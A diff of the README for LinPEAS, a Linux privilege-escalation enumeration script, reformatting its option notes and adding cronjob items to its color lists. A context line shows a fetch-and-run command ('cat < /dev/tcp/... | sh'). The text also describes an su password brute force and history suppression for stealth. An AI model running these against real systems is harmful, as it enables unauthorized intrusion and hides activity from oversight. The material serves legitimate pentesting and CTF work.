@@ -26,7 +26,9 @@ cat < /dev/tcp/10.10.10.10/80 | sh
 ```
 
 ## IMPORTANT CHANGE
-**For satisfying most users and thanks to the incorporation of the 2000pwds/user su bruteforce, the default behaviour of linpeas has been changed to fast/stealth (no writting to disk, no 1min processes check, and no su BF). Use the parameter -a to execute all these checks**
+**For satisfying most users and thanks to the incorporation of the 2000pwds/user su bruteforce, the default behaviour of linpeas has been changed to fast/stealth (no writting to disk, no 1min processes check, and no su BF).**
+
+**Use the parameter `-a` to execute all these checks.**
 
 ## Basic Information
 
@@ -36,17 +38,21 @@ This script doesn't have any dependency.
 
 It uses **/bin/sh** sintax, so can run in anything supporting `sh` (and the binaries and parameters used).
 
-By default, **linpeas won't write anything to disk and won't try to login as any other user using `su`**. 
+By default, **linpeas won't write anything to disk and won't try to login as any other user using `su`**.
 
-It could take from **3 to 4 minutes** to execute all the checks using **-a** parameter (less than 1 min to make almost all the checks, 20s/user bruteforce with top2000 passwords, almost 1 min to search for possible passwords inside all the accesible files of the system, and 1 min to monitor the processes in order to find very frequent cron jobs). 
+By default linpeas takes around **1 min** to complete, but It could take from **3 to 4 minutes** to execute all the checks using **-a** parameter *(Recommended option for CTFs)*:
+- Less than 1 min to make almost all the checks
+- Almost 1 min to search for possible passwords inside all the accesible files of the system
+- 20s/user bruteforce with top2000 passwords *(need `-a`)* - Notice that this check is **super noisy**
+- 1 min to monitor the processes in order to find very frequent cron jobs *(need `-a`)* - Notice that this check will need to **write** some info inside a file that will be deleted
 
-Other parameters: 
+**Other parameters:**
 - **-a** (all checks) - This will **execute also the check of processes during 1 min, and brute-force each user using `su` with the top2000 passwords.**
 - **-s** (superfast & stealth) - This will bypass some time consuming checks - **Stealth mode** (Nothing will be written to disk)
 
 This script has **several lists** included inside of it to be able to **color the results** in order to highlight PE vector.
 
-LinPEAS also **exports a new PATH** variable if common folders aren't present in the original PATH variable. It also **exports** unset and export several environmental commands so no command executed during the session will be saved in the history file (you can avoid this actions using the parameter **-n**).
+LinPEAS also **exports a new PATH** variable if common folders aren't present in the original PATH variable. It also **exports and unset** some environmental variables so no command executed during the session will be saved in the history file (you can avoid this actions using the parameter **-n**).
 
 ![](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/linPEAS/images/help.png)
 
@@ -86,6 +92,7 @@ The ![](https://placehold.it/15/b32400/000000?text=+) **Red** color is used for 
 - Writables folders in PATH
 - Groups that could lead to root
 - Files that could contains passwords
+- Suspicious cronjobs
 
 The ![](https://placehold.it/15/66ff33/000000?text=+) **Green** color is used for:
 - Common processes run by root
@@ -94,6 +101,7 @@ The ![](https://placehold.it/15/66ff33/000000?text=+) **Green** color is used fo
 - SUID/SGID common binaries (the bin was already found in other machines and searchsploit doesn't identify any vulnerable version)
 - Common .sh files in path
 - Common names of users executing processes
+- Common cronjobs
 
 The ![](https://placehold.it/15/0066ff/000000?text=+) **Blue** color is used for:
 - Users without shell
